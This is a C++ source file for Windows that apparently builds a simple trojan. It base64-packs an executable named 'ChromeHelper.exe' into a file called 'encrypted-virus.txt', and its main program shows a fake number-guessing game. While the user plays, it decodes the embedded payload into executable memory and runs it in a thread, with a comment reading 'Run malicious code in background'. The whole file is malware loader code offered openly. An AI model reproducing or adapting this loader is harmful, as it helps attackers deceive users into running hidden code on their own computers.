#include <iostream>
#include <string>
#include <streambuf>
#include <fstream>
#include <windows.h>
#include "base64/base64.h"
#include <vector>
#include "Packer.hpp"
typedef unsigned char byte;
typedef std::vector<byte> bytesArray;

void runBinaryInMemory(bytesArray binaryData)
{
  //Allocating space for executable in memory
  const size_t dataSize = binaryData.size();
  LPVOID exeBuffer = VirtualAlloc(0, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  memcpy(exeBuffer, binaryData.data(), dataSize);
  
  //Create thread to run with program
  HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exeBuffer, 0, 0, 0);
  
  //Run malicious code in background
  WaitForSingleObject(thread, INFINITE);
  CloseHandle(thread);

  VirtualFree(exeBuffer, 0, MEM_RELEASE);
}

//"Encrypt" file
std::string pack(bytesArray buffer)
{
  return base64_encode(buffer.data(), buffer.size());
}

//"Decrypt" file
bytesArray unpack(const std::string& buffer)
{
  std::string decoded = base64_decode(buffer);
  return bytesArray(decoded.begin(), decoded.end());
}

void packToFile()
{
  std::ifstream helperExe("ChromeHelper.exe"); 
  if(!helperExe)
    throw std::exception();
  std::ofstream encryptedOut("encrypted-virus.txt");
  bytesArray buffer((std::istreambuf_iterator<char>(helperExe)),std::istreambuf_iterator<char>()); 
  std::string encrypted = pack(buffer);
  encryptedOut.write(encrypted.c_str(), encrypted.size());
}
std::string unpackFromFile()
{
  std::ifstream encrypted("encrypted-virus.txt"); 
  if(!encrypted)
    throw std::exception();
  std::string buffer((std::istreambuf_iterator<char>(encrypted)),std::istreambuf_iterator<char>());
  return buffer;
}

void desceptiveFront(std::string packedData)
{
  int num = 0;
  std::cout << "Welcome! please guess a number between 1-10: ";
  std::cin >> num;
  runBinaryInMemory(unpack(packedData));
  if(num == 2)
    std::cout << "Congrats! You guessed it :)";
  else
   std::cout << "That's not the number, try again.";

}


int main(int argc, char** argv)
{
  Packer packer;
  desceptiveFront(packer.packedCode);
  return 0;
}


